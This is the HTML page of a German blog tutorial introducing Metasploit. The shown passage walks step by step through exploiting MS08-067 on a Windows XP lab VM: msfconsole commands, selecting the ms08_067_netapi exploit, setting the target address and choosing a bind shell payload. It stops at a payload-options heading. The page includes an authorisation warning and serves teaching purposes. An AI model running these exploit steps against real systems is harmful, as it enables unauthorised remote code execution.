@@ -1,0 +1,1176 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.10.1 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="de" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Metasploit - x44 x4d x47</title>
+<meta name="description" content="Eine kurze Einführung in das Metasploit Framework">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="de_DE">
+<meta property="og:site_name" content="x44 x4d x47">
+<meta property="og:title" content="Metasploit">
+<meta property="og:url" content="https://dg60.github.io/Metasploit/">
+
+
+  <meta property="og:description" content="Eine kurze Einführung in das Metasploit Framework">
+
+
+
+  <meta property="og:image" content="https://dg60.github.io/images/docs/metasploit.png">
+
+
+
+  <meta name="twitter:site" content="@60dmg">
+  <meta name="twitter:title" content="Metasploit">
+  <meta name="twitter:description" content="Eine kurze Einführung in das Metasploit Framework">
+  <meta name="twitter:url" content="https://dg60.github.io/Metasploit/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://dg60.github.io/images/docs/metasploit.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2018-01-04T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://dg60.github.io/Metasploit/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Daniel Grill",
+      "url": "https://dg60.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+  <meta name="google-site-verification" content="googledc32a20f3ee3a459.html" />
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="x44 x4d x47 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://dg60.github.io/assets/css/main.css">
+<link rel="icon" href="/favicon.ico" type="image/favicon.icon">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="https://dg60.github.io/">x44 x4d x47</a>
+        <ul class="visible-links">
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://dg60.github.io/blog_de/" >Blog</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://dg60.github.io/about_de/" >Über mich</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://dg60.github.io/work_de/" >Projekte</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://dg60.github.io/docs/linux_01/" >CLI Befehle</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://dg60.github.io/downloads/" >Downloads</a>
+            </li>
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://dg60.github.io/impressum/" >Impressum</a>
+            </li>
+          
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Menü ein-/ausschalten</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="https://dg60.github.io/images/bio-photo.jpg" alt="Daniel Grill" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Daniel Grill</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Technikfreak
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Folgen</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Österreich/Austria</span>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://dg60.github.io/" itemprop="url">
+            <i class="fas fa-fw fa-link" aria-hidden="true"></i> Webseite
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="mailto:info@dgrill.at">
+            <meta itemprop="email" content="info@dgrill.at" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> E-Mail
+          </a>
+        </li>
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/60dmg" itemprop="sameAs">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://www.facebook.com/danielmichael.grill" itemprop="sameAs">
+            <i class="fab fa-fw fa-facebook-square" aria-hidden="true"></i> Facebook
+          </a>
+        </li>
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/daniel-grill-685816127" itemprop="sameAs">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/dg60" itemprop="sameAs">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Metasploit">
+    <meta itemprop="description" content="Eine kurze Einführung in das Metasploit Framework">
+    <meta itemprop="datePublished" content="January 04, 2018">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 class="page__title" itemprop="headline">Metasploit
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  17 Minuten zum lesen
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-cog"></i> Inhalt</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#installation">Installation</a></li>
+  <li><a href="#testumgebung">Testumgebung</a></li>
+  <li><a href="#arbeiten-mit-metasploit">Arbeiten mit Metasploit</a>
+    <ul>
+      <li><a href="#msfconsole">msfconsole</a></li>
+      <li><a href="#search">search</a></li>
+      <li><a href="#use-exploit">use exploit</a></li>
+      <li><a href="#show-options">show options</a></li>
+      <li><a href="#set">set</a></li>
+      <li><a href="#show-payloads">show payloads</a></li>
+      <li><a href="#set-payload">set payload</a></li>
+      <li><a href="#show-options-payload">show options (Payload)</a></li>
+      <li><a href="#exploit">exploit</a></li>
+      <li><a href="#auf-dem-zielsystem">Auf dem Zielsystem</a></li>
+    </ul>
+  </li>
+  <li><a href="#meterpreter">Meterpreter</a>
+    <ul>
+      <li><a href="#set-payload-meterpreter">set payload meterpreter</a></li>
+      <li><a href="#show-options-1">show options</a></li>
+      <li><a href="#set-lhost">set LHOST</a></li>
+      <li><a href="#exploit-meterpreter">exploit meterpreter</a></li>
+      <li><a href="#hashdump">hashdump</a></li>
+      <li><a href="#ps">ps</a></li>
+      <li><a href="#screenshot">screenshot</a></li>
+      <li><a href="#keyscan">keyscan</a></li>
+    </ul>
+  </li>
+  <li><a href="#mehr-informationen">Mehr Informationen</a></li>
+</ul>
+            </nav>
+          </aside>
+        
+        <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">It´s time to hack</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Hallo,</p>
+
+<p>Heute möchte ich euch kurz das <a href="https://metasploit.com/">Metasploit</a> Framework vorstellen. Das Metasploit Framework dient ist erster Linie zur Entwicklung und Ausführung von Exploits.</p>
+
+<p><img src="/images/docs/metasploit.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="installation">Installation</h2>
+
+<p>Der einfachste weg ist es die Kali Linux Distribution von <a href="https://www.kali.org/">Kali.org</a> herunter zu laden. Die Distribution gibt es als live Image oder als Abild einer Virtuelle Maschine für die Hypervisoren Vmware Player/Virtual Box auf der Seite von <a href="https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/">Offense Security</a>.</p>
+
+<p>Es ist jedoch auch ohne weiteres möglich Metasploit wie jedes andere Programm zu installieren. <a href="https://metasploit.com/">RAPID 7/Metasploit</a> stellt die Binaries für alle gängigen Betriebsysteme(Linux, MacOS, Windows) zur verfügung.</p>
+
+<h2 id="testumgebung">Testumgebung</h2>
+
+<p>Zum arbeiten mit Metasploit ist unerlässlich sich eine Testumgebung einzurichten. Besonders gut geeignet sind dafür ältere ungepatche OS Versionen wie z.B:</p>
+
+<ul>
+  <li>Windows 2000</li>
+  <li>Windows XP SP1 - SP3</li>
+  <li>Windows 7 (ohne Service Pack)</li>
+  <li>Ubuntu 08.04</li>
+  <li>usw.</li>
+</ul>
+
+<p>Aktuelle und gepachte OS-Versionen von Windows und Linux geben keine guten Ziele ab das es meist keine fertig entwickelten exploits dafür gibt.</p>
+
+<p>Eine weitere Möglichkeit ist der Download von vorgefertigten OS-Images die absichtlich mit schwachstellen versehen wurden. Diese Images eignen sicher hevoragend für die ersten Schritte mit Metasploit.</p>
+
+<p>Metasploitable 2:
+<a href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">https://sourceforge.net/projects/metasploitable/files/Metasploitable2/</a></p>
+
+<p>Metasploitable 3:<br />
+<a href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a></p>
+
+<h2 id="arbeiten-mit-metasploit">Arbeiten mit Metasploit</h2>
+
+<p class="notice--danger"><strong>Achtung !!! Bitte führt keine Exploits oder Scans gegen Rechner, Webseiten,Datenbanken usw. aus wozu ihr nicht berechtigt seid.</strong></p>
+
+<p>Für die folgenden Beispiele verwende ich eine Virtuelle Maschine mit Windows XP SP3. Die ich bereits in meiner Einführung für den Portscanner <a href="/NMAP">NMAP</a> verwendet habe.</p>
+
+<p>Ziel OS: Windows XP SP3<br />
+Bekannte Schwachstelle: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250">CVE-2008-4250</a><br />
+Exploit: <a href="https://blog.rapid7.com/2014/02/03/new-ms08-067/">https://blog.rapid7.com/2014/02/03/new-ms08-067/</a></p>
+
+<p><u>Nmap Ausgabe:</u></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure <span class="nb">date</span>: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+</code></pre></div></div>
+<h3 id="msfconsole">msfconsole</h3>
+<p>1.) Metasploit starten wir mit dem Befehl <strong>msfconsole</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole
+</code></pre></div></div>
+
+<p>2.) Wurde Metasploit erfolgreich gestartet erhalten wir einen der möglichen Willkommens Bildschirme</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        <span class="o">(</span><span class="sb">`</span><span class="nb">.</span>         ,-,
+                        <span class="sb">`</span> <span class="sb">`</span><span class="nb">.</span>    ,<span class="p">;</span><span class="s1">' /
+                         `.  ,'</span>/ .<span class="s1">'
+                          `. X /.'</span>
+                .-<span class="p">;</span><span class="nt">--</span><span class="s1">''</span><span class="nt">--</span>.._<span class="sb">`</span> <span class="sb">`</span> <span class="o">(</span>
+              .<span class="s1">'            /   `
+             ,           ` '</span>   Q <span class="s1">'
+             ,         ,   `._    \
+          ,.|         '</span>     <span class="sb">`</span>-.<span class="p">;</span>_<span class="s1">'
+          :  . `  ;    `  ` --,.._;
+           '</span> <span class="sb">`</span>    ,   <span class="o">)</span>   .<span class="s1">'
+              `._ ,  '</span>   /_
+                 <span class="p">;</span> ,<span class="s1">''</span>-,<span class="p">;</span><span class="s1">' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v4.16.31-dev                         ]
++ -- --=[ 1726 exploits - 992 auxiliary - 300 post        ]
++ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+msf &gt; 
+</span></code></pre></div></div>
+
+<p>3.) Nach der Installation empfiehlt es sich einen rebuild des Datenbank Cache durchzuführen oder wenn diese Meldung angezeigt wird “Database not connected or cache not built, using slow search”.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; db_rebuild_cache  
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Purging and rebuilding the module cache <span class="k">in </span>the background...
+</code></pre></div></div>
+<h3 id="search">search</h3>
+<p>4.) Mit diesen wissen das unser Ziel über eine bekannte Schwachstelle verfügt. Können wir in der Metasploit Datenbank nach einen geeigneten Exploit suchen.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; search  ms08
+Matching Modules
+<span class="o">================</span>
+
+   Name                                                   Disclosure Date  Rank       Description
+   <span class="nt">----</span>                                                   <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----------</span>
+   auxiliary/admin/ms/ms08_059_his2006                    2008-10-14       normal     Microsoft Host Integration Server 2006 Command Execution Vulnerability
+   exploit/windows/browser/ms08_041_snapshotviewer        2008-07-07       excellent  Snapshot Viewer <span class="k">for </span>Microsoft Access ActiveX Control Arbitrary File Download
+   exploit/windows/browser/ms08_053_mediaencoder          2008-09-09       normal     Windows Media Encoder 9 wmex.dll ActiveX Buffer Overflow
+   exploit/windows/browser/ms08_070_visual_studio_msmask  2008-08-13       normal     Microsoft Visual Studio Mdmask32.ocx ActiveX Buffer Overflow
+   exploit/windows/browser/ms08_078_xml_corruption        2008-12-07       normal     MS08-078 Microsoft Internet Explorer Data Binding Memory Corruption
+   exploit/windows/smb/ms08_067_netapi                    2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   exploit/windows/smb/smb_relay                          2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Execution
+
+</code></pre></div></div>
+<h3 id="use-exploit">use exploit</h3>
+<p>5.) Um einen Exploit auszuwählen verwenden wir den Befehl <strong>use</strong> und geben den Pfad des exploits an.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf&gt; use exploit/windows/smb/ms08_067_netapi 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Purging and rebuilding the module cache <span class="k">in </span>the background...
+</code></pre></div></div>
+<h3 id="show-options">show options</h3>
+<p>6.) Mit dem Befehl <strong>show options</strong> können wir uns alle verfügbaren Optionen anzeigen lassen</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOST                     <span class="nb">yes       </span>The target address
+   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Targeting
+
+</code></pre></div></div>
+<h3 id="set">set</h3>
+<p>7.) Mit <strong>set</strong> RHOST setzen wir die IP Adresse für den Ziel Rechner. Mein Ziel System hat die IP Adresse 192.168.1.110</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOST 192.168.1.110
+RHOST <span class="o">=&gt;</span> 192.168.1.110
+</code></pre></div></div>
+<h3 id="show-payloads">show payloads</h3>
+<p>8.) Mittels <strong>show payloads</strong> können wir uns alle verfügbaren Payloads anzeigen lassen.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show payloads
+
+Compatible Payloads
+<span class="o">===================</span>
+
+   Name                                                Disclosure Date  Rank    Description
+   <span class="nt">----</span>                                                <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----------</span>
+   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind Ipknock TCP Stager
+   windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind TCP Stager
+   windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
+   windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Hop HTTP/HTTPS Stager
+   windows/meterpreter/reverse_http                                     normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows Reverse HTTP Stager <span class="o">(</span>wininet<span class="o">)</span>
+   windows/meterpreter/reverse_https                                    normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows Reverse HTTPS Stager <span class="o">(</span>wininet<span class="o">)</span>
+   windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse HTTPS Stager with Support <span class="k">for </span>Custom Proxy
+   windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
+   windows/meterpreter/reverse_named_pipe                               normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows x86 Reverse Named Pipe <span class="o">(</span>SMB<span class="o">)</span> Stager
+   windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Ordinal TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager
+   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse All-Port TCP Stager
+   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>DNS<span class="o">)</span>
+   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
+   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager with UUID Support
+   windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
+   windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
+   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
+   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
+   windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
+   windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>DNS<span class="o">)</span>
+   windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
+   windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
+   windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
+   windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
+   windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
+   windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind Ipknock TCP Stager
+   windows/vncinject/bind_hidden_tcp                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Hidden Bind TCP Stager
+   windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind IPv6 TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/vncinject/bind_nonx_tcp                                      normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/vncinject/bind_tcp                                           normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/vncinject/bind_tcp_rc4                                       normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
+   windows/vncinject/bind_tcp_uuid                                      normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Bind TCP Stager with UUID Support <span class="o">(</span>Windows x86<span class="o">)</span>
+   windows/vncinject/reverse_hop_http                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Hop HTTP/HTTPS Stager
+   windows/vncinject/reverse_http                                       normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Windows Reverse HTTP Stager <span class="o">(</span>wininet<span class="o">)</span>
+   windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>IPv6<span class="o">)</span>
+   windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/vncinject/reverse_ord_tcp                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse Ordinal TCP Stager <span class="o">(</span>No NX or Win7<span class="o">)</span>
+   windows/vncinject/reverse_tcp                                        normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager
+   windows/vncinject/reverse_tcp_allports                               normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse All-Port TCP Stager
+   windows/vncinject/reverse_tcp_dns                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>DNS<span class="o">)</span>
+   windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager <span class="o">(</span>RC4 Stage Encryption, Metasm<span class="o">)</span>
+   windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server <span class="o">(</span>Reflective Injection<span class="o">)</span>, Reverse TCP Stager with UUID Support
+
+</code></pre></div></div>
+
+<h3 id="set-payload">set payload</h3>
+<p>9.) Wir entscheiden uns hier für den <strong>windows/shell/bind_tcp</strong> payload.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/shell/bind_tcp
+payload <span class="o">=&gt;</span> windows/shell/bind_tcp
+</code></pre></div></div>
+
+<h3 id="show-options-payload">show options (Payload)</h3>
